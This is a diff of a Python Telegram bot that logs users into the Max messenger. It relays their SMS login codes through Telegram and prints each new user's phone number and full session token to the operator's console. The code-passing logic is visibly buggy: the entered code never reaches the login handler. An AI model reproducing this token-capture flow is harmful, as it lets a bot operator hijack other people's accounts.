@@ -10,7 +10,7 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from dotenv import load_dotenv
 
-from pymax import MaxClient
+from pymax import SocketMaxClient
 from pymax.payloads import UserAgentPayload
 
 # ========== ЗАГРУЗКА ПЕРЕМЕННЫХ ==========
@@ -56,36 +56,41 @@ async def process_phone(message: types.Message, state: FSMContext):
     await message.answer(f"📱 Отправляю запрос на номер {phone}...")
     
     try:
-        # Создаём клиент Max
+        # Создаём клиент для входа по номеру телефона
         ua = UserAgentPayload(device_type="DESKTOP", app_version="25.12.13")
-        client = MaxClient(
+        client = SocketMaxClient(
             phone=phone,
-            work_dir=f"cache_{user_id}",  # отдельная папка для каждого пользователя
+            work_dir=f"cache_{user_id}",
             headers=ua
         )
         
-        # Сохраняем клиент во временной сессии
-        temp_sessions[user_id] = {
-            "client": client,
-            "phone": phone
-        }
+        # Создаём событие для ожидания кода
+        code_received = asyncio.Event()
+        user_code = None
         
-        # Запускаем клиент (он сам отправит код)
-        # Но нам нужно сначала получить код, поэтому запускаем в фоне
-        # и ждём код через callback
-        
-        # Устанавливаем обработчик для кода
+        # Подписываемся на запрос кода
         @client.on_code_request
         async def on_code_request():
-            # Это вызывается, когда Max запрашивает код
-            # Бот уже попросил пользователя ввести код
-            pass
+            nonlocal user_code
+            # Уведомляем пользователя через Telegram
+            await message.answer("📲 Код отправлен! Введите код из SMS:")
+            # Переводим состояние бота в ожидание кода
+            await state.set_state(RegStates.waiting_code)
+            # Ждём, пока пользователь введёт код
+            await code_received.wait()
+            # Возвращаем код библиотеке
+            return user_code
         
-        # Запускаем клиент в отдельной задаче
+        # Сохраняем данные сессии
+        temp_sessions[user_id] = {
+            "client": client,
+            "phone": phone,
+            "code_received": code_received,
+            "user_code": user_code
+        }
+        
+        # Запускаем клиент в фоне (он сам начнёт процесс авторизации)
         asyncio.create_task(client.start())
-        
-        await message.answer("✅ Код отправлен! Введите код из SMS:")
-        await state.set_state(RegStates.waiting_code)
         
     except Exception as e:
         print(f"[ERROR] {type(e).__name__}: {e}")
@@ -98,6 +103,7 @@ async def process_code(message: types.Message, state: FSMContext):
     code = message.text.strip()
     user_id = message.from_user.id
     
+    # Проверяем сессию
     if user_id not in temp_sessions:
         await message.answer("❌ Сессия истекла. Начните заново с /start")
         await state.clear()
@@ -106,34 +112,37 @@ async def process_code(message: types.Message, state: FSMContext):
     session = temp_sessions[user_id]
     client = session["client"]
     phone = session["phone"]
+    code_received = session["code_received"]
+    
+    # Передаём код в обработчик
+    session["user_code"] = code
+    code_received.set()
     
     await message.answer("🔐 Подтверждаю код...")
     
     try:
-        # Передаём код клиенту
-        # В PyMax есть метод для подтверждения кода
-        # Нужно посмотреть точное API, возможно так:
-        # await client.confirm_code(code)
+        # Даём время на завершение авторизации
+        await asyncio.sleep(5)
         
-        # После успешной авторизации токен сохранится в client.me
-        # и в папке work_dir
-        
-        # Дождёмся авторизации
-        await asyncio.sleep(5)  # Даём время на авторизацию
-        
+        # Проверяем, авторизован ли клиент
         if client.is_authorized:
-            token = client.me.token  # или client.token
+            token = client.me.token
             await message.answer(
                 f"✅ **Регистрация в Max успешна!**\n\n"
                 f"📱 Номер: `{phone}`\n"
                 f"🔑 Токен: `{token[:30]}...`\n\n"
-                f"⚠️ Сохраните этот токен.",
+                f"⚠️ Сохраните токен для будущих входов.",
                 parse_mode="Markdown"
             )
-            print(f"✅ Токен: {token}")
+            print(f"\n{'='*50}")
+            print(f"✅ НОВЫЙ ПОЛЬЗОВАТЕЛЬ")
+            print(f"📱 Номер: {phone}")
+            print(f"🔑 Токен: {token}")
+            print(f"{'='*50}\n")
         else:
-            await message.answer("❌ Не удалось авторизоваться. Проверьте код.")
+            await message.answer("❌ Не удалось авторизоваться. Проверьте код и попробуйте снова /start")
         
+        # Очищаем сессию
         del temp_sessions[user_id]
         await state.clear()
         
